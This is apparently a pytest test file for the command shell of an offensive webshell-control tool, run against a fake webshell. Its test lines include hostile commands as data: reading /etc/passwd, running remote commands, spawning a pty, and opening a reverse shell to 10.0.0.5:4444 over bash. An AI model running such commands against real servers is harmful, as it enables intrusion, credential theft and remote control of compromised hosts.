"""REPL command dispatch exercised offline with a fake WebShell.

Commands are driven through ``onecmd_plus_hooks`` (the real cmd2 parse path) so
the namespaced argparse surface is exercised end-to-end.
"""

import builtins

import pytest

from webshell_sniper.config import Config
from webshell_sniper.repl import Repl
from webshell_sniper.session import Session


class FakeExec:
    def __init__(self):
        self.disabled_functions: set[str] = {"exec"}

    def fs_list(self, path):
        return [("a.txt", 10, "644", 1700000000, "-"), ("d", 4096, "755", 1700000001, "d")]

    def fs_read_text(self, path):
        return f"contents-of-{path}"

    def fs_mkdir(self, path):
        return True

    def fs_chmod(self, path, mode):
        return True

    def fs_move(self, src, dst):
        return True

    def fs_copy(self, src, dst):
        return True


class FakeWS:
    def __init__(self, host="t"):
        from types import SimpleNamespace

        self.url = f"http://{host}/c.php"
        self.method = "POST"
        self.password = "c"
        self.webroot = "/var/www"
        self.php_version = "8.2.0"
        self.kernel_version = "Linux test"
        self.executor = FakeExec()
        self.info = SimpleNamespace(
            to_dict=lambda: {"url": self.url, "method": self.method, "password": "c"}
        )

    def run_command(self, command):
        return f"ran:{command}"

    def run_php(self, code):
        return ""

    def __str__(self):
        return f"{self.method} {self.url}"


@pytest.fixture
def repl():
    return Repl([FakeWS()], Config(output_dir="."), session=Session([FakeWS()]))


def run(repl, line):
    """Drive a line through the full cmd2 parse/dispatch path."""
    repl.onecmd_plus_hooks(line)


def test_recon_info(repl, capsys):
    run(repl, "recon info")
    run(repl, "recon php")
    run(repl, "recon kernel")
    out = capsys.readouterr().out
    assert "8.2.0" in out and "Linux test" in out


def test_bare_group_lists_actions(repl, capsys):
    run(repl, "recon")  # bare group prints its action list
    out = capsys.readouterr().out
    assert "privesc" in out and "writable-php" in out


def test_prompt_reflects_exec_target(repl):
    assert "REMOTE" in repl.prompt  # default routes bare input to the target
    run(repl, "local")
    assert "LOCAL" in repl.prompt and repl.local_exec is True
    run(repl, "remote")
    assert "REMOTE" in repl.prompt and repl.local_exec is False


def test_pwd_default(repl, capsys):
    run(repl, "pwd")
    assert "server default" in capsys.readouterr().out


def test_file_ls_renders_table(repl, capsys):
    run(repl, "file ls /var/www")
    out = capsys.readouterr().out
    assert "a.txt" in out and "name" in out


def test_file_read_and_filemgr_ops(repl, capsys):
    run(repl, "file read /etc/passwd")
    run(repl, "file mkdir /tmp/x")
    run(repl, "file chmod 755 /tmp/x")
    run(repl, "file mv /a /b")
    run(repl, "file cp /a /b")
    out = capsys.readouterr().out
    assert "contents-of-/etc/passwd" in out


def test_file_chmod_usage_error(repl, capsys):
    run(repl, "file chmod onlyone")  # missing the `path` positional
    err = capsys.readouterr().err
    assert "chmod" in err and "required" in err


def test_exec_runs_remote(repl, capsys):
    run(repl, "exec id")
    out = capsys.readouterr().out
    assert "ran:id" in out


def test_bare_input_defaults_remote(repl, capsys):
    run(repl, "whoami")  # unrecognised → default() → remote (the new default)
    out = capsys.readouterr().out
    assert "ran:whoami" in out


def test_local_mode_runs_local(monkeypatch, repl):
    ran = {}
    monkeypatch.setattr("subprocess.run", lambda *a, **k: ran.setdefault("cmd", a))
    run(repl, "local")
    run(repl, "echo hi")  # default() → local exec
    assert ran


def test_history_records_and_lists(repl, capsys):
    run(repl, "exec id")
    run(repl, "history")
    assert "exec id" in capsys.readouterr().out


def test_pivot_pty(repl, capsys):
    run(repl, "pivot pty")
    assert "pty.spawn" in capsys.readouterr().out


def test_version(repl, capsys):
    run(repl, "version")
    assert "Webshell-Sniper" in capsys.readouterr().out


def test_save_writes_session(tmp_path):
    repl = Repl([FakeWS()], Config(output_dir=tmp_path), session=Session([FakeWS()]))
    run(repl, "save")
    assert list(tmp_path.glob("session_*.json"))


def test_recon_commands_run(repl):
    # These just need to not raise (they call run_command / disabled_functions).
    run(repl, "recon writable")
    run(repl, "recon writable-php")
    run(repl, "recon disabled")


def test_rm_self_delete_confirm_abort(monkeypatch, repl, capsys):
    monkeypatch.setattr(repl, "_interactive", lambda: True)
    monkeypatch.setattr(builtins, "input", lambda *_: "n")
    run(repl, "file rm")  # no path → self-delete → confirmation → aborted
    assert "Aborted" in capsys.readouterr().out


def test_rm_self_delete_refused_noninteractive(repl, capsys):
    # Not a TTY → must refuse rather than block or destroy access silently.
    run(repl, "file rm")
    assert "Refusing" in capsys.readouterr().err


def test_pivot_shell_scriptable(monkeypatch, repl, capsys):
    # Flags supplied inline → runs without prompting (scriptable).
    calls = {}
    monkeypatch.setattr(
        "webshell_sniper.features.revshell.reverse_shell",
        lambda ws, ip, port, method: calls.setdefault("args", (ip, port, method)),
    )
    run(repl, "pivot shell -i 10.0.0.5 -p 4444 -m bash")
    assert calls["args"] == ("10.0.0.5", 4444, "bash")


def test_remote_path_completion_cached(repl):
    seen = {"n": 0}

    def fake_run(command):
        seen["n"] += 1
        return "alpha/\nbeta.txt\ngamma/\n"

    repl.webshells[0].run_command = fake_run
    first = repl._complete_remote_path("be", "file read be", 10, 12)
    second = repl._complete_remote_path("be", "file read be", 10, 12)
    assert first == ["beta.txt"] and second == ["beta.txt"]
    assert seen["n"] == 1  # second TAB served from the cache
